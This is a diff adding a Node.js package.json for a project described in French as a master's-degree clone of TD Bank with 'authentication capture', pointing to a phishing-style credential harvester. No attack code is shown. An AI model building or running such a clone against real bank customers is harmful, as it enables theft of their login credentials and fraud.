@@ -1,0 +1,12 @@
+{
+  "name": "td-bank-master",
+  "version": "1.0.0",
+  "description": "Projet Master - Clone TD Bank avec capture d'authentification",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "engines": {
+    "node": "18.x"
+  }
+}
